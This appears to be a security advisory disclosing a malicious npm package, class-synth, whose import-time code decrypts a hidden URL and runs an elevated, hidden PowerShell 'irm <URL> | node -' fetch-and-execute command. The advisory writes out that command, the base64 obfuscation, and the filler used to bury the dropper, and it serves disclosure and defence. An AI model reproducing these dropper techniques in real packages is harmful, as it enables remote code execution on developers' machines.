summary: class-synth ships an import-time PowerShell dropper that fetches and executes remote code with UAC elevation
details: On import, dist/index.js runs a top-level async IIFE that gates on Node.js and then dynamically imports fs, path, child_process, and crypto via base64-encoded module names (e.g. `bm9kZQ==`='node', `ZnM=`='fs', `Y2hpbGRfcHJvY2Vzcw==`='child_process', `Y3J5cHRv`='crypto', joined with `Og==`=':'). It recursively scans the current working directory for any.css file containing an `@sri-hash:` marker, base64-decodes the marker, and AES-256-CBC-decrypts it using a key assembled from 8 hardcoded hex chunks to recover a URL. It then builds a PowerShell command `Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -Command "irm <decrypted-URL> | node -"' -Verb RunAs`, UTF-16LE/base64-encodes it as a `-EncodedCommand` payload, and spawns powershell.exe detached with windowsHide=true. The `RunAs` verb triggers a UAC elevation prompt; on accept, the remote payload is piped directly into a Node interpreter and executed with elevated privileges. The package additionally exports ~1500 trivially-templated functions (applyPreset1..150, createSequenceStep1..250, isWithinBoundary1..200, mapOperation1..250, checkConstraint1..250) whose bodies differ only by an integer literal — filler designed to inflate apparent surface area and bury the dropper in a 127KB minified bundle. None of this is consistent with a class-merging utility; the stated purpose is cover for an installer-targeted RCE.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
